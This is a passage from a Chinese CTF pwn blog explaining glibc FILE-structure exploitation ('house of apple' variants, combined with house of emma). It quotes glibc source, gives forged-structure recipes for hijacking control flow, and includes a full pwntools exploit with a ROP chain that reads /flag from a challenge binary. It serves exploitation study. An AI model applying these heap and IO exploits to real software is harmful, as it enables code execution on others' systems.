f-&gt;_wide_data-&gt;_IO_buf_end = eb;  if (a)    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;  else    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;&#125;\n\n所以一般来说需要绕过free函数，所以我们可以控制_flags2=8即可\n随后就是_IO_wstrnfile结构体涉及到其他结构体：\nstruct _IO_str_fields&#123;  _IO_alloc_type _allocate_buffer_unused;  _IO_free_type _free_buffer_unused;&#125;; struct _IO_streambuf&#123;  FILE _f;  const struct _IO_jump_t *vtable;&#125;; typedef struct _IO_strfile_&#123;  struct _IO_streambuf _sbf;  struct _IO_str_fields _s;&#125; _IO_strfile; typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  char overflow_buf[64];&#125; _IO_strnfile;  typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n因为其中存在着其他结构体，最后可以看出来overflow_buf的偏移量位0xf0，那就是在vtable后面\n而struct _IO_wide_data结构体如下：\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n最后呢，也就是在调用vtable之前需要绕过的一点是：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    &#123;      run_fp = fp;      if (do_lock)\t_IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\t   || (_IO_vtable_offset (fp) == 0\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\t   )\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\tresult = EOF;      if (do_lock)\t_IO_funlockfile (fp);      run_fp = NULL;    &#125;#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;&#125;\n\n构造方式这里我看原创文章的构造描述和他写的demo的构造方式存在一定差异，所以我这里根据下面的demo来描述构造方式：\n\n首先修改vtable的值为：_IO_wstrn_jumps\n绕过free，修改_flags2的值为8\n修改_IO_write_ptr的值为-1\n最后修改_wide_data的地址为我们的目标地址\n\n利用思路这里修改mp_结构体和global_max_fast就不再赘述，这两者的攻击方式类似，这里重点提一下如何配合house of pig\n与house of pig的联用在我之前的FSOP这篇文章的关于vtable的检验实际上并不完善，其中只提到了检验内部vtable，关于外部vtable的检验没怎么提。\n_IO_vtable_check (void)&#123;#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check)    return;  /* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */  &#123;    Dl_info di;    struct link_map *l;    if (!rtld_active ()        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))      return;  &#125;#else /* !SHARED */  /* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */  if (__dlopen != NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\\n&quot;);&#125;\n\n可以看到这里如果我们的flag值等于_IO_vtable_check的值，函数就会立即返回\n\n通过汇编代码可知这里是将IO_accept_foreign_vtables经过PTR_DEMANGLE这样一个函数的变化最后进行比较，而在house of emma中这个函数的本质就是上面汇编中显示的循环右移0x11然后与fs:0x30也就是pointer_guard进行异或。所以，如果pointer_guard和IO_accept_foreign_vtables是我们已知的值，我们即可绕过这一判断。最后任意伪造vtable劫持程序执行流即可。\n与house of emma联用相较于上面的需要进行两次任意地址写的情况，这一利用方式算是比较简单，只需要通过house of apple修改pointer_guard的值，随后进行house of emma即可。\n例题演示例题使用的方式为house of apple &amp; house of emma\n因为原创已经分析过了，这里就不再分析了，这里主要提一下堆风水即可。\n首先题目申请chunk的size只能申请三种，分别是：key+0x10，key+0x20，2*key+0x10\n并且题目的输入只能输入一次，所以我们需要在修改掉已经在large bin中的chunk的bk_nextsize的指针的同时修改掉即将进入large bin的chunk的内容为我们伪造的IO_FILE结构体。\n所以我们的目标是，有一个指针指向我们已经在large bin中的chunk，并且在这个chunk的内部还存在一个我们即将进入large bin的chunk，并且我们还希望，在修改bk_nextsize之后紧接着就可以修改掉后一个chunk的内容，让我们可控的内容尽可能的多一点。(其实仔细思考一下发现我们完全可以构造成ptr，ptr+0x30效果也是差不多，构造起来还较为简单一点)\nexpfrom pwn import *elf = ELF(&#x27;./oneday&#x27;)r = process(&#x27;./oneday&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(opt):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;choise: &#x27;)    r.sendline(bytes(str(opt), encoding=&#x27;utf-8&#x27;))def delete(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, msg):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Message:&#x27;)    r.send(msg)def show(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def pack_file(IO_write_base=0,              IO_write_ptr=0,              _chain=0,              _lock=0,              _wide_data=0,              _mode=0,              vtable=0):    IO_FILE = b&#x27;\\x00&#x27; * 0x20 + p64(IO_write_base) + p64(IO_write_ptr)    IO_FILE = IO_FILE.ljust(0x68, b&#x27;\\x00&#x27;) + p64(_chain) + p32(0) + p32(8)    IO_FILE = IO_FILE.ljust(0x88, b&#x27;\\x00&#x27;) + p64(_lock)    IO_FILE = IO_FILE.ljust(0xa0, b&#x27;\\x00&#x27;) + p64(_wide_data)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;) + p64(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILEdef ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;enter your key &gt;&gt;&#x27;)r.sendline(b&#x27;10&#x27;)create(2)create(2)create(1)delete(2)delete(1)delete(0)create(1)create(1)create(1)create(1)delete(3)delete(5)show(3)r.recvuntil(b&#x27;Message: \\n&#x27;)libc_base = u64(r.recv(8)) - 0x1f2cc0heap_base = u64(r.recv(8)) - 0x17f0print(hex(heap_base))print(hex(libc_base))_IO_list_all = libc_base + 0x1f3660pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))point_guard_addr = libc_base + 0x3c0770 - 0x10_IO_wstrn_jumps = libc_base + 0x1f3d20_IO_cookie_jumps = libc_base + 0x1f3ae0gadget = libc_base + 0x146020setcontext = libc_base + 0x50bc0open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]write_addr = libc_base + libc.symbols[&#x27;write&#x27;]flag_addr = heap_base + 0x1a88delete(4)delete(6)create(3)create(1)create(1)file1 = pack_file(0, 1, heap_base + 0x1900, libc_base + 0x1f5720,                  point_guard_addr, 0, _IO_wstrn_jumps)file2 = pack_file(0, 1, 0, libc_base + 0x1f5720, 0, 0, _IO_cookie_jumps + 0x58)delete(8)create(3)payload = flat(0, _IO_list_all - 0x20, 0, 0xa81) + file1[0x10:]payload = payload.ljust(0x100, b&#x27;\\x00&#x27;) + file2 + flat(    heap_base + 0x1900 + 0x100, ROL(gadget ^ (heap_base + 0x1900), 0x11))payload = payload.ljust(0x108 + 0x20, b&#x27;\\x00&#x27;) + p64(setcontext + 61)payload = payload.ljust(0x108 + 0x68, b&#x27;\\x00&#x27;) + p64(flag_addr) + p64(0)payload = payload.ljust(    0x108 + 0xa0, b&#x27;\\x00&#x27;) + p64(heap_base + 0x1900 + 0x200) + p64(open_addr)payload = payload.ljust(    0x200, b&#x27;\\x00&#x27;) + flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss() + 0x100,                           pop_rdx, 0x100, read_addr)payload = payload + flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss() + 0x100,                         pop_rdx, 0x100, write_addr) + b&#x27;/flag\\x00\\x00\\x00&#x27;payload = payload.ljust(0xa90, b&#x27;\\x00&#x27;) + flat(0, 0xab1)payload = payload.ljust(0xaa0, b&#x27;\\x00&#x27;)edit(5, payload)delete(2)create(3)print(hex(libc_base + libc.bss() + 0x100))gdb.attach(    r,    &#x27;b*$rebase(0x1439)\\ndir ../glibc_source/glibc-2.34/libio/\\nb _IO_wstrn_overflow&#x27;)r.recvuntil(b&#x27;enter your command:&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n总结house of apple与以往的house of系列存在一定区别，他的效果只是任意地址写堆地址，将_IO_FILE地址+0xf0的地址写到_IO_wide_data所指向的地址(当然结合源码看的话可以看出来是进行一定范围的写操作)\n其实house of apple只是单纯的利用fcloseall函数会循环调用_IO_FILE的_chain，也就是利用一次任意地址写的机会进行多次_IO_FILE利用\n\n参考链接：https://bbs.pediy.com/thread-273418.htm\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of apple续","url":"/2022/08/05/house-of-apple2/","content":"死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。\nhouse of apple2利用条件：\n已知heap地址和glibc地址\n\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n\n能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制\n\n\n利用原理在https://cv196082.gitee.io/2022/02/23/FSOP/ 这篇文章中详细介绍了去调用vtable中的函数指针时会经过什么验证。\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n注意_IO_wide_data结构体中存在_wide_vtable成员，在调用_wide_vtable虚表是同样会经过一系列宏去调用：\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n在这里调用的顺序中没有出现vtable是否合法的检测，因此我们可以劫持_IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可以控制的堆空间，进一步控制_wide_data-&gt;_wide_vtable指向可以控制的堆地址，控制程序IO流函数调用，最终调用到IO_wxxxxx\n利用思路这里最终目的是调用_wide_vtable成员，所以需要找到上述宏的调用，最终发现只存在以下四个：_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE、_IO_WOVERFLOW\n并且其中前两个还是利用难度较高，甚至是无法利用。下面从原文的三个方向出发\n_IO_wfile_overflow这里的调用链为：_IO_wfile_overflow=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+ 0x68)(fp)\nwint_t    _IO_wfile_overflow (FILE *f, wint_t wch)&#123;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    /* If currently reading or no buffer allocated. */    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)    &#123;        /* Allocate a buffer if needed. */        if (f-&gt;_wide_data-&gt;_IO_write_base == 0)        &#123;            _IO_wdoallocbuf (f);           ......        &#125;    &#125;&#125;\n\n需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0\n接着看_IO_wdoallocbuf\nvoid_IO_wdoallocbuf (FILE *fp)&#123;  if (fp-&gt;_wide_data-&gt;_IO_buf_base)    return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)      return;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);&#125;libc_hidden_def (_IO_wdoallocbuf)\n\n这里就调用了IO_Wxxxx并且需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。\n所以总的来说构造方式为：\n\n_flags = ~(2 | 0x8 | 0x800)即可，所以可以直接设置为0或者这值为  sh;\nvtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable +0x68)(fp)\nstatic wint_t_IO_wfile_underflow_mmap (FILE *fp)&#123;  struct _IO_codecvt *cd;  const char *read_stop;   if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   /* Maybe there is something left in the external buffer.  */  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end      /* No.  But maybe the read buffer is not fully set up.  */      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */    return WEOF;   /* There is more in the external.  Convert it.  */  read_stop = (const char *) fp-&gt;_IO_read_ptr;   if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)    &#123;      free (fp-&gt;_wide_data-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    &#125;      _IO_wdoallocbuf (fp);    &#125;    ......&#125;\n\n这里需要改写的有点略多了，需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。\n构造方式：\n\n_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为  sh;\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wdefault_xsgetn调用链：_IO_wdefault_xsgetn=&gt;__wunderflow=&gt;_IO_switch_to_wget_mode=&gt;_IO_WOVERFLOW=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+0x18)(fp)\nsize_t    _IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)&#123;    size_t more = n;    wchar_t *s = (wchar_t*) data;    for (;;)    &#123;        /* Data available. */        ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end                         - fp-&gt;_wide_data-&gt;_IO_read_ptr);        if (count &gt; 0)        &#123;            if ((size_t) count &gt; more)                count = more;            if (count &gt; 20)            &#123;                s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);                fp-&gt;_wide_data-&gt;_IO_read_ptr += count;            &#125;            else if (count &lt;= 0)                count = 0;            else            &#123;                wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;                int i = (int) count;                while (--i &gt;= 0)                    *s++ = *p++;                fp-&gt;_wide_data-&gt;_IO_read_ptr = p;            &#125;            more -= count;        &#125;        if (more == 0 || __wunderflow (fp) == WEOF)            break;    &#125;    return n - more;&#125;libc_hidden_def (_IO_wdefault_xsgetn)\n\n需要设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。\nwint_t    __wunderflow (FILE *fp)&#123;    if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))        return WEOF;    if (fp-&gt;_mode == 0)        _IO_fwide (fp, 1);    if (_IO_in_put_mode (fp))        if (_IO_switch_to_wget_mode (fp) == EOF)            return WEOF;    ......&#125;\n\n需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。\nint    _IO_switch_to_wget_mode (FILE *fp)&#123;    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)            return EOF;    .....&#125;\n\n需要设置fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base\n构造方式：\n\n_flags设置为0x800\nvtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可\n_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A\n_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C\n\nhouse of apple3前两篇文章中的利用链主要关注_wide_data成员，而本篇文章并不会特别关注_wide_data，而是关注FILE结构体的另外一个成员_codecvt的利用。\n利用条件\n已知heap地址和glibc地址\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n能控制_IO_FILE的vtable和_codecvt，一般使用largebin attack去控制\n\n注意上面提到，本篇文章并不会特别关注_wide_data成员，这是因为_wide_data设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的_wide_data成员（默认会指向_IO_wide_data_2，除了_wide_vtable外其他成员均默认为0），也并不影响house of apple3的利用。因此，如果能伪造整个FILE结构体，则需要设置合适的_wide_data；如果只能伪部分FILE的成员的话，保持fp-&gt;_wide_data为默认地址即可。\n利用原理FILE结构体中有一个成员struct _IO_codecvt *_codecvt;，偏移为0x98。\nstruct _IO_codecvt&#123;  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n__cd_in和__cd_out是同一种类型的数据。\ntypedef struct&#123;  struct __gconv_step *step;  struct __gconv_step_data step_data;&#125; _IO_iconv_t;\n\n再观察以下结构体俩变量的定义：\nstruct __gconv_step&#123;  struct __gconv_loaded_object *__shlib_handle;  const char *__modname;   /* For internal use by glibc.  (Accesses to this member must occur     when the internal __gconv_lock mutex is acquired).  */  int __counter;   char *__from_name;  char *__to_name;   __gconv_fct __fct;  __gconv_btowc_fct __btowc_fct;  __gconv_init_fct __init_fct;  __gconv_end_fct __end_fct;   /* Information about the number of bytes needed or produced in this     step.  This helps optimizing the buffer sizes.  */  int __min_needed_from;  int __max_needed_from;  int __min_needed_to;  int __max_needed_to;   /* Flag whether this is a stateful encoding or not.  */  int __stateful;   void *__data;        /* Pointer to step-local data.  */&#125;;\n\nstruct __gconv_step_data&#123;  unsigned char *__outbuf;    /* Output buffer for this step.  */  unsigned char *__outbufend; /* Address of first byte after the output                 buffer.  */   /* Is this the last module in the chain.  */  int __flags;   /* Counter for number of invocations of the module function for this     descriptor.  */  int __invocation_counter;   /* Flag whether this is an internal use of the module (in the mb*towc*     and wc*tomb* functions) or regular with iconv(3).  */  int __internal_use;   __mbstate_t *__statep;  __mbstate_t __state;    /* This element must not be used directly by               any module; always use STATEP!  */&#125;;\n\nhouse of apple3的利用主要关注以下三个函数：__libio_codecvt_out、__libio_codecvt_in和__libio_codecvt_length。三个函数的利用点都差不多\nenum __codecvt_result    __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,                        const char *from_start, const char *from_end,                        const char **from_stop,                        wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)&#123;    enum __codecvt_result result;    struct __gconv_step *gs = codecvt-&gt;__cd_in.step;    int status;    size_t dummy;    const unsigned char *from_start_copy = (unsigned char *) from_start;    codecvt-&gt;__cd_in.step_data.__outbuf = (unsigned char *) to_start;    codecvt-&gt;__cd_in.step_data.__outbufend = (unsigned char *) to_end;    codecvt-&gt;__cd_in.step_data.__statep = statep;    __gconv_fct fct = gs-&gt;__fct;    #ifdef PTR_DEMANGLE    if (gs-&gt;__shlib_handle != NULL)        PTR_DEMANGLE (fct);    #endif    status = DL_CALL_FCT (fct,                          (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,                           (const unsigned char *) from_end, NULL,                           &amp;dummy, 0, 0));    ......&#125;\n\ntypedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,                const unsigned char **, const unsigned char *,                unsigned char **, size_t *, int, int); #ifndef DL_CALL_FCT# define DL_CALL_FCT(fct, args) fct args#endif\n\n这里呢最后这个宏就是调用fct (gs, …)\n在_IO_wfile_underflow函数中调用了__libio_codecvt_in\nwint_t    _IO_wfile_underflow (FILE *fp)&#123;    struct _IO_codecvt *cd;    enum __codecvt_result status;    ssize_t count;    /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)        return WEOF;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    &#123;        /* There is more in the external.  Convert it.  */        const char *read_stop = (const char *) fp-&gt;_IO_read_ptr;        fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;        fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =            fp-&gt;_wide_data-&gt;_IO_buf_base;        status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                     fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                                     &amp;read_stop,                                     fp-&gt;_wide_data-&gt;_IO_read_ptr,                                     fp-&gt;_wide_data-&gt;_IO_buf_end,                                     &amp;fp-&gt;_wide_data-&gt;_IO_read_end);        ......    &#125;&#125;\n\n_IO_wfile_underflow又是_IO_wfile_jumps这个_IO_jump_t类型变量的成员函数\n所以总的来说利用方式为：劫持或者伪造FILE结构体的fp-&gt;vtable为_IO_wfile_jumps，fp-&gt;_codecvt为可控堆地址，当程序执行IO操作时，控制程序执行流走到_IO_wfile_underflow，设置好fp-&gt;codecvt-&gt;__cd_in结构体，使得最终调用到__libio_codecvt_in中的DL_CALL_FCT宏，伪造函数指针，进而控制程序执行流。需要注意的是设置gs-&gt;__shlib_handle == NULL绕过__pointer_guard指针的加密保护\n利用思路因为原文作者确实非常牛逼，甚至链都找好了，所以这里还是贴上原文的内容\n_IO_wfile_underflow调用链：_IO_wfile_underflow=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs =fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\n这条链是在利用原理当作示例的一条，所以这里只给出构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_underflow即可\nfp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs=fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nstatic wint_t    _IO_wfile_underflow_mmap (FILE *fp)&#123;    struct _IO_codecvt *cd;    const char *read_stop;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end        /* No.  But maybe the read buffer is not fully set up.  */        